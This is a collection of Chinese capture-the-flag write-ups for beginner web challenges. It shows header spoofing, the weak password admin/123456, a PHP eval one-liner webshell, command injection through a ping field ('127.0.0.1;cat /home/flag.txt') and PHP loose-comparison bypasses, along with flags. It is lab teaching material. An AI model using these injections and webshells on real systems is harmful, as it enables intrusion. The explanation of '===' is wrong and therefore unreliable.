# simple-js

## writeup

查看源码，找到一串十六进制

```
\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30
```

使用python将其转义

```python
s="\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"
print s
```

得到如下数组

```
55,56,54,79,115,69,114,116,107,49,50
```

然后在web的f12的控制台中输入如下代码

```
document.write(String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50))
```

即可得到密码，将该密码按照flag的格式输入即可。

# xff_referer

## 题目描述

X老师告诉小宁其实xff和referer是可以伪造的。 

## 题目来源

Cyberpeace-n3k0 

## 题目链接

http://adworld.xctf.org.cn/adw/answer/5068/?primary=web

## writeup

首先打开题目页面，提示“ip地址必须为123.123.123.123”![1544158337422](F:\学习资料\hacker\学习笔记\ctf\writeup\xctf攻防世界\web\assets\1544158337422.png)

通过burp，抓包，添加header信息。

```html
X-Forwarded-For: 123.123.123.123
```

接下来又提示“必须来自https://www.google.com”

![1544158557002](F:\学习资料\hacker\学习笔记\ctf\writeup\xctf攻防世界\web\assets\1544158557002.png)

通过burp，抓包，继续添加header信息。

```
X-Forwarded-For: 123.123.123.123
referer: https://www.google.com
```

最终得到flag

```html
xctf{8efb56dcd82357938f7d5baf9e479be3}
```

# weak_auth

## 题目描述

小宁写了一个登陆验证页面，随手就设了一个密码。 

## 题目来源

 Cyberpeace-n3k0 

## 题目链接

http://adworld.xctf.org.cn/adw/answer/5069/?primary=web

## writeup

打开题目页面，可以看到是一个登陆页面

![1544158816160](F:\学习资料\hacker\学习笔记\ctf\writeup\xctf攻防世界\web\assets\1544158816160.png)

然后发现是弱口令，admin/123456进去了。拿到flag

```
xctf{b46ca05b4db7e81daa58d2a020ed8fd6}
```

# webshell

## 题目描述

小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。 

## 题目来源

Cyberpeace-n3k0 

## 题目链接

http://adworld.xctf.org.cn/adw/answer/5070/?primary=web

## writeup

打开页面，提示信息如下：

```php
你会使用webshell吗？
<?php @eval($_POST['shell']);?> 
```

![1544159090602](F:\学习资料\hacker\学习笔记\ctf\writeup\xctf攻防世界\web\assets\1544159090602.png)

根据提示，直接选择菜刀连接一句话。

![1544159162214](F:\学习资料\hacker\学习笔记\ctf\writeup\xctf攻防世界\web\assets\1544159162214.png)

可以看到，有一个`flag.txt`

打开，即可看到flag

```html
xctf{36180279fd1897c9d5dc96e938fe2b84}
```

# command_execution

## 题目描述

小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。 

## 题目来源

Cyberpeace-n3k0 

## 题目链接

http://adworld.xctf.org.cn/adw/answer/5071/?primary=web

## writeup

查看页面，可以发现只有一个ping的接口。根据题目提示，可以知道这道题是要考命令执行。

那么我们可以拼接命令来执行，首先查看flag文件在那里

```
127.0.0.1;find / -name flag*
```

根据输出，可以知道flag文件在`/home/flag.txt`

然后查看flag文件的内容

```
127.0.0.1;cat /home/flag.txt
```

可以得到flag

```html
xctf{54f7515f2d78bdc9bee514f22a1c4d3b}
```

# simple_php

## 题目描述

小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。 

## 题目来源

Cyberpeace-n3k0 

## 题目链接

http://adworld.xctf.org.cn/adw/answer/5072/?primary=web

## writeup

打开页面，看到页面中有一段php的代码

```php
<?php 
show_source(__FILE__); 
include("config.php"); 
$a=@$_GET['a']; 
$b=@$_GET['b']; 
if($a==0 and $a){ 
    echo $flag1; 
} 
if(is_numeric($b)){ 
    exit(); 
} 
if($b>1234){ 
    echo $flag2; 
} 
?> 
```

根据代码可以知道，其中就是做两次判断，一次是当a=a的时候，另一次是b>1234的时候，但是b又设定说如果输入的是数字，就退出。

这里就要利用php弱类型

### php弱类型

- php中有两种比较符号:
- `==`: 先将字符串类型转化成相同，再比较
- `===`: 先将字符串类型转化成相同，再比较
- 字符串和数字比较使用`==`时,字符串会先转换为数字类型再比较 `php var_dump('a' == 0);//true，这里'a'会被转换数字0 var_dump('123a' == 123);//true，这里'123a'会被转换为123`

### 解题

根据这个弱类型的情况来分析代码。

首先前半段可以写成`a=a`，然后后半段由于php容易忽略字母a，因此可以写成`b=1235a`

这样就可以绕过b的检测，并且弱类型的原因，还可以最终形成`b=1235`的样子。

最终提交的url为

```html
http://111.198.29.45:30268/index.php?a=a&b=1235b
```

得到flag

```html
Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}
```

